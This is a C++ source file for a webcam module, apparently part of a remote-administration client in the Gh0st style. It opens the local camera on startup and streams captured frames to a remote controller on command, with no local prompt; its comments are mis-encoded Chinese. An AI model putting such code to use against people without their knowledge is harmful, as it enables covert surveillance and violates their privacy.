// VideoManager.cpp: implementation of the CVideoManager class.
//
//////////////////////////////////////////////////////////////////////

#include "stdafx.h"
#include "VideoManager.h"
#include "Common.h"
#include <iostream>

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

CVideoManager::CVideoManager(IOCPClient* ClientObject, int n) : CManager(ClientObject)
{
	m_bIsWorking = TRUE;

	m_bIsCompress = false;
	m_pVideoCodec = NULL;
	m_fccHandler = 1129730893;

	m_CapVideo.Open(0,0);  // ����

	m_hWorkThread = CreateThread(NULL, 0, 
		(LPTHREAD_START_ROUTINE)WorkThread, this, 0, NULL);
}


DWORD CVideoManager::WorkThread(LPVOID lParam)
{
	CVideoManager *This = (CVideoManager *)lParam;
	static DWORD	dwLastScreen = GetTickCount();

	if (This->Initialize())          //ת��Initialize
	{
		This->m_bIsCompress=true;    //�����ʼ���ɹ������ÿ���ѹ��
	}

	This->SendBitMapInfor();         //����bmpλͼ�ṹ
	// �ȿ��ƶ˶Ի����

	This->WaitForDialogOpen();  

	while (This->m_bIsWorking)
	{
		// �����ٶ�
		if ((GetTickCount() - dwLastScreen) < 150)
			Sleep(100);

		dwLastScreen = GetTickCount();
		This->SendNextScreen(); //����û��ѹ����صĴ����ˣ����ǵ�sendNextScreen  ����
	}

	This->Destroy();
	std::cout<<"CVideoManager WorkThread end\n";

	return 0;
}

CVideoManager::~CVideoManager()
{
	InterlockedExchange((LPLONG)&m_bIsWorking, FALSE);

	WaitForSingleObject(m_hWorkThread, INFINITE);
	CloseHandle(m_hWorkThread);
	std::cout<<"CVideoManager ~CVideoManager \n";
	if (m_pVideoCodec)   //ѹ����
	{
		delete m_pVideoCodec;
		m_pVideoCodec = NULL;
	}
}

void CVideoManager::Destroy()
{
	std::cout<<"CVideoManager Destroy \n";
	if (m_pVideoCodec)   //ѹ����
	{
		delete m_pVideoCodec;
		m_pVideoCodec = NULL;
	}
}

void CVideoManager::SendBitMapInfor()
{
	const int	dwBytesLength = 1 + sizeof(BITMAPINFO);
	BYTE szBuffer[dwBytesLength + 3] = { 0 };
	szBuffer[0] = TOKEN_WEBCAM_BITMAPINFO;
	memcpy(szBuffer + 1, m_CapVideo.GetBmpInfor(), sizeof(BITMAPINFO));
	m_ClientObject->OnServerSending((char*)szBuffer, dwBytesLength);
}

void CVideoManager::SendNextScreen()
{
	DWORD dwBmpImageSize=0;
	LPVOID	lpDIB =m_CapVideo.GetDIB(dwBmpImageSize);
	// token + IsCompress + m_fccHandler + DIB
	int		nHeadLen = 1 + 1 + 4;

	UINT	nBufferLen = nHeadLen + dwBmpImageSize;
	LPBYTE	lpBuffer = new BYTE[nBufferLen];

	lpBuffer[0] = TOKEN_WEBCAM_DIB;
	lpBuffer[1] = m_bIsCompress;   //ѹ��  

	memcpy(lpBuffer + 2, &m_fccHandler, sizeof(DWORD));     //���ｫ��Ƶѹ����д��Ҫ���͵Ļ�����

	UINT	nPacketLen = 0;
	if (m_bIsCompress && m_pVideoCodec) //�����жϣ��Ƿ�ѹ����ѹ�����Ƿ��ʼ���ɹ�������ɹ���ѹ��          
	{
		int	nCompressLen = 0;
		//����ѹ����Ƶ������ 
		bool bRet = m_pVideoCodec->EncodeVideoData((LPBYTE)lpDIB, 
			m_CapVideo.GetBmpInfor()->bmiHeader.biSizeImage, lpBuffer + nHeadLen, 
			&nCompressLen, NULL);
		if (!nCompressLen)
		{
			// some thing error
			delete [] lpBuffer;
			return;
		}
		//���¼��㷢�����ݰ��Ĵ�С  ʣ�¾��Ƿ����ˣ����ǵ����ض˿�һ����Ƶ���ѹ������ô����
		//�����ض˵�void CVideoDlg::OnReceiveComplete(void)
		nPacketLen = nCompressLen + nHeadLen;
	}
	else
	{
		//��ѹ��  ��Զ����
		memcpy(lpBuffer + nHeadLen, lpDIB, dwBmpImageSize);
		nPacketLen = dwBmpImageSize+ nHeadLen;
	}
	m_CapVideo.SendEnd();    //copy  send

	m_ClientObject->OnServerSending((char*)lpBuffer, nPacketLen);

	delete [] lpBuffer;
}


VOID CVideoManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
{
	switch (szBuffer[0])
	{
	case COMMAND_NEXT:
		{
			NotifyDialogIsOpen();
			break;
		}	
	}
}

BOOL CVideoManager::Initialize()
{
	BOOL	bRet = TRUE;

	if (m_pVideoCodec!=NULL)         
	{                              
		delete m_pVideoCodec;
		m_pVideoCodec=NULL;           
	}
	if (m_fccHandler==0)         //������ѹ��
	{
		bRet= FALSE;
		return bRet;
	}
	m_pVideoCodec = new CVideoCodec;
	//�����ʼ������Ƶѹ�� ��ע�������ѹ����  m_fccHandler(�����캯���в鿴)
	if (!m_pVideoCodec->InitCompressor(m_CapVideo.GetBmpInfor(), m_fccHandler))
	{
		delete m_pVideoCodec;
		bRet=FALSE;
		// ��NULL, ����ʱ�ж��Ƿ�ΪNULL���ж��Ƿ�ѹ��
		m_pVideoCodec = NULL;
	}
	return bRet;
}
